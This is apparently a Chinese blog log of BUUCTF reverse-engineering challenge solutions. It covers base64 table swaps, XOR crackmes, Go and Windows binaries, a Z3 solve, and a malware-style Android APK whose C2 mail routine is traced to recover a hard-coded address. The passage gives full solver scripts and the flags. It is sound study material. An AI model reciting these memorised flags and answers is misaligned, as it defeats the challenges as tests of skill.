<p>那么这题思路就是，先将MXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9进行大小写转换，然后再进行base64解密，base64的加密表ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/要进行替换（注意这里要加上ABCDEFGHIJ，应该是ida的问题，他把这一个变量分开了），所以实际上是将ABC…开始下标为6-14的字符替换为从KLMN…的6-14，那么就是6-14被替换为16-24</p>
<p>替换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">字符串转换为列表</span></span><br><span class="line"><span class="string">str1 = &quot;12345&quot;</span></span><br><span class="line"><span class="string">list1 = list(str1)</span></span><br><span class="line"><span class="string">print list1</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">str2 = &quot;123 sjhid dhi&quot;</span></span><br><span class="line"><span class="string">list2 = str2.split() #or list2 = str2.split(&quot; &quot;)</span></span><br><span class="line"><span class="string">print list2</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">str3 = &quot;www.google.com&quot;</span></span><br><span class="line"><span class="string">list3 = str3.split(&quot;.&quot;)</span></span><br><span class="line"><span class="string">print list3</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">b=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">b=<span class="built_in">list</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">15</span>):</span><br><span class="line">    t=b[i]</span><br><span class="line">    b[i]=b[i+<span class="number">10</span>]</span><br><span class="line">    b[i+<span class="number">10</span>]=t</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(b))</span><br><span class="line"><span class="comment">#ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>大小写转换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span></span><br><span class="line"></span><br><span class="line">flag1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">if</span> char.islower():</span><br><span class="line">        flag1+=char.upper()</span><br><span class="line">    <span class="keyword">elif</span> char.isupper():</span><br><span class="line">        flag1+=char.lower()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag1+=char</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="comment">#ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9</span></span><br></pre></td></tr></table></figure>



<h2 id="换表的base64解密"><a href="#换表的base64解密" class="headerlink" title="换表的base64解密"></a>换表的base64解密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9&quot;</span>   <span class="comment"># 欲解密的字符串</span></span><br><span class="line">outtab  = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">#  原生字母表</span></span><br><span class="line">intab   = <span class="string">&quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">#  换表之后的字母表</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(<span class="built_in">str</span>.translate(<span class="built_in">str</span>.maketrans(intab,outtab))))</span><br></pre></td></tr></table></figure>

<h1 id="17-MRCTF2020-Xor1"><a href="#17-MRCTF2020-Xor1" class="headerlink" title="17.[MRCTF2020]Xor1"></a>17.[MRCTF2020]Xor1</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230607232729394.png" alt="image-20230607232729394"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230607233341395.png" alt="image-20230607233341395"></p>
<p>这题竟然不能看伪代码</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230608000307548.png" alt="image-20230608000307548"></p>
<p>长度为1b，也就是27</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230608000342318.png" alt="image-20230608000342318"></p>
<p>这里就是比较的地方了，跟进一下byte_14EA08</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230608000420990.png" alt="image-20230608000420990"></p>
<p>直接动调了一下</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230608000821925-16861541026511.png" alt="image-20230608000821925"></p>
<p>就是输入的数据和0-27分别异或</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line">a=<span class="built_in">list</span>(a)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i^<span class="built_in">ord</span>(a[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<p>MRCTF{@_R3@1ly_E2_R3verse!}</p>
<h1 id="18-MRCTF2020-hello-world-go1"><a href="#18-MRCTF2020-hello-world-go1" class="headerlink" title="18.[MRCTF2020]hello_world_go1"></a>18.[MRCTF2020]hello_world_go1</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609010046450.png" alt="image-20230609010046450"></p>
<p>打开ida，f5查看伪代码</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609010148358.png" alt="image-20230609010148358"></p>
<p>go语言的反汇编第一次接触，不是很熟悉，查看下字符串信息，检索下flag看看有没有关键点</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609010806063.png" alt="image-20230609010806063"></p>
<p>太多了。。。还是直接看伪代码吧</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609011108400.png" alt="image-20230609011108400"></p>
<p>这里发现有两个比较函数，看看各个变量的信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609011136441.png" alt="image-20230609011136441"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609011144775.png" alt="image-20230609011144775"></p>
<p>结果这里已经存在flag了，选中后按a提取字符串</p>
<p>flag{hello_world_gogogo}</p>
<h1 id="19-相册1"><a href="#19-相册1" class="headerlink" title="19.相册1"></a>19.相册1</h1><p>你好，这是上次聚会相片，你看看（病毒，不建议安装到手机，提取完整邮箱即为flag） 注意：得到的 flag 请包上 flag{} 提交</p>
<p>安卓逆向，jadx打开</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609012334141.png" alt="image-20230609012334141"></p>
<p>这里有个Base64的加密</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609012457694.png" alt="image-20230609012457694"></p>
<p>还有个二维码</p>
<p>提取完整邮箱就是flag，那就找找mail相关的</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609012935761.png" alt="image-20230609012935761"></p>
<p>这里发现了flag关键词</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230609013034928.png" alt="image-20230609013034928"></p>
<p>同时检索mail关键词时看到了sendMail的字眼，那肯定跟邮箱相关，跟进第一个看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610010117903.png" alt="image-20230610010117903"></p>
<p>这里调用了C2class，跟进看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610010154312.png" alt="image-20230610010154312"></p>
<p>这里好像是一些发送信息，回到sendMail，看看哪里调用了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610010502892.png" alt="image-20230610010502892"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610010557260.png" alt="image-20230610010557260"></p>
<p>这里的MailServer可能就是邮箱，而且这个是C2部分的声明，那回到C2分析</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011006477.png" alt="image-20230610011006477"></p>
<p>这里可以看到System.loadLibrary，猜测这些变量是调用了名叫core的so文件，用ida打开so文件，搜索NativeMethod</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011504984.png" alt="image-20230610011504984"></p>
<p>MailServer调用的是NativeMethod.m，跟进看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011550907.png" alt="image-20230610011550907"></p>
<p>Base64解码看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011625735.png" alt="image-20230610011625735"></p>
<p>这个应该就是我们想要的flag了</p>
<p><a href="mailto:&#x31;&#x38;&#x32;&#x31;&#x38;&#52;&#54;&#x35;&#49;&#x32;&#x35;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#x38;&#x32;&#x31;&#x38;&#52;&#54;&#x35;&#49;&#x32;&#x35;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
<h1 id="20-WUSTCTF2020-level3"><a href="#20-WUSTCTF2020-level3" class="headerlink" title="20.[WUSTCTF2020]level3"></a>20.[WUSTCTF2020]level3</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011813600.png" alt="image-20230610011813600"></p>
<p>无壳，打开ida，主函数如下，再看看字符串信息有没有什么关键的</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011849600.png" alt="image-20230610011849600"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011929307.png" alt="image-20230610011929307"></p>
<p>这里有串Base64编码，并且下面应该是编码表</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610012005400.png" alt="image-20230610012005400"></p>
<p>看起来没有换表</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610011849600.png" alt="image-20230610011849600"></p>
<p>回到主函数分析，输入flag，如果随机数生成是偶数执行else语句，但是else语句提示了好像跟标准的base64加密不一样，，，估计哪里遗漏了信息，找找text段里有没有相关函数吧</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610012844727.png" alt="image-20230610012844727"></p>
<p>看到main函数的上方有个O_OLookAtYou函数，查找引用，反汇编</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610012920312.png" alt="image-20230610012920312"></p>
<p>看来这个就是换表函数了ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">base_table=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">base_table=<span class="built_in">list</span>(base_table)</span><br><span class="line">v1=[]</span><br><span class="line">res=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    v1=base_table[i]</span><br><span class="line">    base_table[i]=base_table[<span class="number">19</span>-i]</span><br><span class="line">    res=<span class="number">19</span>-i</span><br><span class="line">    base_table[res]=v1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(base_table))</span><br><span class="line"><span class="comment">#TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span></span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span>   <span class="comment"># 欲解密的字符串</span></span><br><span class="line">outtab  = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">#  原生字母表</span></span><br><span class="line">intab   = <span class="string">&quot;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">#  换表之后的字母表</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(<span class="built_in">str</span>.translate(<span class="built_in">str</span>.maketrans(intab,outtab))))</span><br></pre></td></tr></table></figure>

<p>wctf2020{Base64_is_the_start_of_reverse}</p>
<h1 id="21-FlareOn4-IgniteMe"><a href="#21-FlareOn4-IgniteMe" class="headerlink" title="21.[FlareOn4]IgniteMe"></a>21.[FlareOn4]IgniteMe</h1><p>Hint:本题解出相应字符串后请用flag{}包裹，形如：flag{<a href="mailto:&#x31;&#50;&#51;&#x34;&#53;&#54;&#x40;&#x66;&#x6c;&#97;&#114;&#101;&#45;&#x6f;&#110;&#46;&#99;&#x6f;&#x6d;">&#x31;&#50;&#51;&#x34;&#53;&#54;&#x40;&#x66;&#x6c;&#97;&#114;&#101;&#45;&#x6f;&#110;&#46;&#99;&#x6f;&#x6d;</a>}</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230610014219160.png" alt="image-20230610014219160"></p>
<p>打开ida，查看字符串信息，字符串信息很少</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612202831303.png" alt="image-20230612202831303"></p>
<p>主函数代码如下：</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612202932482.png" alt="image-20230612202932482"></p>
<p>看到了WriteFile函数，前面还有两个GetStdHandle函数，这个函数应该是获取标准输入输出流的句柄，然后将数据写入文件，那个sub_4010F0函数应该是加密函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612204200554.png" alt="image-20230612204200554"></p>
<ol>
<li><code>dword_403070</code>：这是一个句柄（handle），代表要读取的文件、设备或管道。在你的代码中，它的值为<code>dword_403070</code>，即先前通过<code>GetStdHandle</code>函数获取的标准输入流句柄。</li>
<li><code>v2</code>：这是一个指向缓冲区的指针，用于存储从文件或设备中读取的数据。在你的代码中，它可能是一个变量的名称，用于存储读取的数据。</li>
<li><code>260</code>：这是一个整数值，表示要读取的最大字节数。在这种情况下，最多读取260个字节的数据。</li>
<li><code>&amp;v3</code>：这是一个指向变量的指针，用于存储实际读取的字节数。函数执行后，会将实际读取的字节数存储在<code>v3</code>所指向的变量中。</li>
<li><code>0</code>：这是一个控制标志（dwFlags），用于指定读取操作的一些选项。在这种情况下，值为0表示使用默认的读取选项。</li>
</ol>
<p>跟进一下sub_401020函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612204249373.png" alt="image-20230612204249373"></p>
<p>没什么用，就是为了前面for循环给个结束条件，sub_401020是个赋值函数</p>
<p>那么sub_4010F0函数应该就是读取文件数据的，回到主函数吧</p>
<p>进入sub_401050函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612205322629.png" alt="image-20230612205322629"></p>
<p>把输入的值赋给了v1，跟进一下sub_401000函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612205414419.png" alt="image-20230612205414419"></p>
<p>这里是循环左移4位？ 然后又右移1位，不太清楚这里v4的值是多少，但是可以动调出来</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612205807311.png" alt="image-20230612205807311"></p>
<p>下断点，开始动调</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612210103255.png" alt="image-20230612210103255"></p>
<p>这里eax变成了0x00700004，返回值是int16，也就是十六进制下的后四位，0x0004，所以v4就是4,。这里我后续去搜了一下wp，有个对__ROL__函数的分析__ROL__()函数：循环左移函数，第一个数是循环左移的值，第二个参数是循环左移的位数，最后再整体逻辑右移</p>
<p>即将0x80070000向左循环移动4位，即× 24(相当于十六进制向左移动一位)，得到0x00700008。 然后再右移一位得到0x00700004。还要注意到return(int16),即取十六进制的后两个字节。 故v4=0x0004<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61156124/article/details/130133649">https://blog.csdn.net/qq_61156124/article/details/130133649</a></p>
<p>回到这个函数：</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612210406102.png" alt="image-20230612210406102"></p>
<p>后续就比较简单了，异或后比较，查看一下byte_403000的值</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612210542604.png" alt="image-20230612210542604"></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">13</span>,  <span class="number">38</span>,  <span class="number">73</span>,  <span class="number">69</span>,  <span class="number">42</span>,  <span class="number">23</span>, <span class="number">120</span>,  <span class="number">68</span>,  <span class="number">43</span>, <span class="number">108</span>,</span><br><span class="line">   <span class="number">93</span>,  <span class="number">94</span>,  <span class="number">69</span>,  <span class="number">18</span>,  <span class="number">47</span>,  <span class="number">23</span>,  <span class="number">43</span>,  <span class="number">68</span>, <span class="number">111</span>, <span class="number">110</span>,</span><br><span class="line">   <span class="number">86</span>,   <span class="number">9</span>,  <span class="number">95</span>,  <span class="number">69</span>,  <span class="number">71</span>, <span class="number">115</span>,  <span class="number">38</span>,  <span class="number">10</span>,  <span class="number">13</span>,  <span class="number">19</span>,</span><br><span class="line">   <span class="number">23</span>,  <span class="number">72</span>,  <span class="number">66</span>,   <span class="number">1</span>,  <span class="number">64</span>,  <span class="number">77</span>,  <span class="number">12</span>,   <span class="number">2</span>, <span class="number">105</span>,   <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">v4=<span class="number">4</span></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    temp=v4^a[i]</span><br><span class="line">    flag[i]=temp</span><br><span class="line">    v4=temp</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag))</span><br></pre></td></tr></table></figure>

<p>flag{<a href="mailto:&#82;&#x5f;&#x79;&#x30;&#x75;&#95;&#x48;&#x30;&#116;&#95;&#x33;&#x6e;&#x30;&#x75;&#103;&#72;&#95;&#x74;&#48;&#x5f;&#x31;&#x67;&#110;&#49;&#116;&#x33;&#64;&#x66;&#x6c;&#x61;&#114;&#x65;&#45;&#x6f;&#110;&#x2e;&#99;&#111;&#109;">&#82;&#x5f;&#x79;&#x30;&#x75;&#95;&#x48;&#x30;&#116;&#95;&#x33;&#x6e;&#x30;&#x75;&#103;&#72;&#95;&#x74;&#48;&#x5f;&#x31;&#x67;&#110;&#49;&#116;&#x33;&#64;&#x66;&#x6c;&#x61;&#114;&#x65;&#45;&#x6f;&#110;&#x2e;&#99;&#111;&#109;</a>}</p>
<h1 id="23-GWCTF-2019-xxor"><a href="#23-GWCTF-2019-xxor" class="headerlink" title="23.[GWCTF 2019]xxor"></a>23.[GWCTF 2019]xxor</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230612230557705.png" alt="image-20230612230557705"></p>
<p>打开ida，查看一下字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230614000813131.png" alt="image-20230614000813131"></p>
<p>找到关键函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230614000934311.png" alt="image-20230614000934311"></p>
<p>主函数逻辑比较简单，先输入flag，然后再第二个for循环中进行加密，最后再进行对比。输入要求是6个整数，每个整数提供 <code>4字节</code> 的存储空间。存储到 <code>8字节</code> 的<code>v6</code>数组中。所以这6个数据实际上只占用了3个<code>v6</code>数组。</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230614004356744.png" alt="image-20230614004356744"></p>
<p>由于 <code>v6</code> 是 <code>8字节</code> 的而 <code>dword_601078</code> 是 <code>4字节</code> 的。所以直接将 <code>v6[0]</code> 赋给 <code>dword_601078</code> 。实际上只是得到的是 <code>v6[0]</code> 数据低位的 <code>4个字节</code> 。也就是上述中的 <code>p[0]</code> ，而 <code>dword_60107C</code> 就是 <code>p[1]</code></p>
<p>进入一下加密函数，sub_400686看看，asc_601060数据为2,0,0,0,2,0,0,0,3,0,0,0,4,0,0,0</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230614003638029.png" alt="image-20230614003638029"></p>
<p>主函数的sub_400770函数如下</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230614004641696.png" alt="image-20230614004641696"></p>
<p>解出a1可以使用Z3约束求解，Z3约束我也是第二次使用，所以此次详细记录一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#一共有6个未知数,且是整数类型的，设未知数</span></span><br><span class="line">a0, a1, a2, a3, a4, a5 = Ints(<span class="string">&#x27;a0 a1 a2 a3 a4 a5&#x27;</span>)</span><br><span class="line">s=Solver()</span><br><span class="line"><span class="comment">#列方程</span></span><br><span class="line">s.add(a2 - a3 == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(a3 + a4 == <span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(a2 - a4 == <span class="number">0x42D731A8</span>)</span><br><span class="line">s.add(a0 == <span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(a5 ==  <span class="number">0x84F30420</span>)</span><br><span class="line">s.add(a1 == <span class="number">0x20CAACF4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无解&quot;</span>)</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">[a4 = <span class="number">2652626477</span>,</span><br><span class="line"> a0 = <span class="number">3746099070</span>,</span><br><span class="line"> a2 = <span class="number">3774025685</span>,</span><br><span class="line"> a5 = <span class="number">2230518816</span>,</span><br><span class="line"> a3 = <span class="number">1548802262</span>,</span><br><span class="line"> a1 = <span class="number">550153460</span>] </span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<p>解出的这六个数据就是我们输入的flag[6]，接下来逆向加密函数，加密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400686</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = a1[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += <span class="number">1166789954</span>;</span><br><span class="line">    v3 += (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + *a2) ^ ((v4 &gt;&gt; <span 